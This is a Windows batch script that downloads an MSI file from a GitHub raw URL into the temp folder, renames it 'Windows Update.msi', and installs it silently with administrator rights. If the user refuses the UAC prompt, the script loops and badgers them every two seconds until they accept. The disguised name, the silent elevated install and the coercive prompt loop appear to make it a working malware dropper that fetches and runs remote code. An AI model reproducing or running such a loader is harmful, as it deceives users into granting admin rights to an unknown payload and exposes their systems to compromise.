@echo off
setlocal enabledelayedexpansion

:: Set download URL and paths
set "url=https://raw.githubusercontent.com/Boyretro/documentation/refs/heads/main/sets.msi"
set "outputFileName=Windows Update.msi"
set "outputFilePath=%TEMP%\%outputFileName%"

:: Delete existing file if any
if exist "%outputFilePath%" del /f /q "%outputFilePath%"

echo Downloading MSI from %url% ...
powershell -Command ^
  "try { Invoke-WebRequest -Uri '%url%' -OutFile '%outputFilePath%' -UseBasicParsing } catch { exit 1 }"

if not exist "%outputFilePath%" (
    echo Download failed. Exiting.
    exit /b 1
)

:RunLoop
echo Attempting to run MSI installer with UAC prompt...

:: Try to elevate and run the MSI silently
:: We use PowerShell to run msiexec.exe as admin, and wait for it
:: If the user clicks "No" in UAC, the process won't launch, so we check

powershell -Command ^
  "$p = Start-Process msiexec.exe -ArgumentList '/i \"%outputFilePath%\" /qn' -Verb runAs -PassThru -ErrorAction SilentlyContinue; if ($p) { $p.WaitForExit(); exit 0 } else { exit 1 }"

:: Check if last command succeeded (user clicked Yes)
if %ERRORLEVEL%==0 (
    echo Installation started successfully.
    exit /b 0
)

:: Otherwise, user clicked "No"
echo.
echo [!] You clicked "No" in the UAC prompt.
echo Please click "Yes" to continue the installation.

:: Wait 2 seconds before trying again
timeout /t 2 /nobreak >nul
goto RunLoop


